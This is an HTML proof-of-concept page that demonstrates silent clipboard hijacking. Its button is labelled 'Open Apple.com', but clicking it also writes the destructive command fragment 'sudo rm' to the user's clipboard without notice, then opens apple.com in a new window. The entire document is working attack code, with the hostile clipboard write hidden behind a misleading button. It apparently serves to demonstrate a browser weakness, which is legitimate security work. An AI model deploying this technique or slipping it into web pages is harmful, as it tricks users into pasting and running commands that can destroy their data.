<!doctype html>
<html>
<head><meta charset="utf-8"><title>POC - Clipboard OverWrite Silently</title></head>
<body>
  <button id="btn">Open Apple.com</button>
  <pre id="log">Ready.</pre>
<script>
const btn = document.getElementById('btn');
const logEl = document.getElementById('log');
const payload = 'sudo rm';

function appendLog(msg){
  logEl.textContent += '\n[' + new Date().toISOString() + '] ' + msg;
  console.log(msg);
}

btn.addEventListener('click', (ev) => {
  // MUST be synchronous inside the click handler
  const newWin = window.open('about:blank', '_blank'); // <- no 3rd arg
  if (!newWin) {
    appendLog('Popup blocked => window.open returned null.');
    alert('Popup blocked. Check extensions/settings or try in a clean profile.');
    return;
  }
  appendLog('New window opened (about:blank).');

  // Do clipboard write (async) AFTER opening the window
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(payload).then(() => {
      appendLog('Clipboard write succeeded.');
      try {
        newWin.location.href = 'https://apple.com';
        appendLog('New window navigated to https://apple.com');
      } catch (e) {
        appendLog('Navigation failed: ' + e);
        newWin.document.body.innerText = 'Clipboard write succeeded; please visit https://apple.com';
      }
    }).catch(err => {
      appendLog('Clipboard write failed: ' + err);
      try { newWin.document.body.innerText = 'Clipboard write failed: ' + err; } catch(e){}
    });
  } else {
    appendLog('Clipboard API not available; navigating new window anyway.');
    newWin.location.href = 'https://apple.com';
  }
});
</script>
</body>
</html>
